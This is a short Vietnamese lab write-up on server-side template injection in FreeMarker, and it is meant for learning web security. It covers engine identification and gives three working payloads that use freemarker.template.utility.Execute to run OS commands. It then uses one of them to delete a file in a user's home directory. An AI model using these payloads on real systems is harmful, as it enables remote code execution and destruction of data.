## Server-side template injection using documentation

Người dùng có quyền sửa template

![image-20220718082226171](C:/Users/tuandv/AppData/Roaming/Typora/typora-user-images/image-20220718082226171.png)

Cú pháp ${someExpression} sẽ render template và trả lại kết quả

![image](https://user-images.githubusercontent.com/68894302/179433529-7eaf0dc5-bcb5-4e51-abce-202efc69f10a.png)

Việc đầu tiên là tìm xem ứng dụng đang sử dụng template engine nào

![image](https://user-images.githubusercontent.com/68894302/179434037-681ed16b-01f5-44d5-a051-e3ef28e74625.png)

Xác định template Freemaker đang được sử dụng. 

Payload sử dụng để lấy RCE Freemaker

``` 
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

+ __#assign__ cho phép định nghĩa biến trong template [freemaker](http://freemarker.org/docs/dgui_misc_var.html). Đoạn này khai báo biến __ex__ và sử dụng Built-in `"freemarker.template.utility.Execute"?new()` cho phép tạo object tùy ý chính là object của "Excute" Class được implement từ "TemplateModel".

+ Sử dụng 1 trong các payload trên để xóa file /morale.txt trong thư mục home của người dùng carlos

  ![image](https://user-images.githubusercontent.com/68894302/179434408-612d69e2-1a75-4423-871d-ce765685677b.png)

![image](https://user-images.githubusercontent.com/68894302/179434449-6cada302-91c1-4ce7-87ee-3ec6a23daaab.png)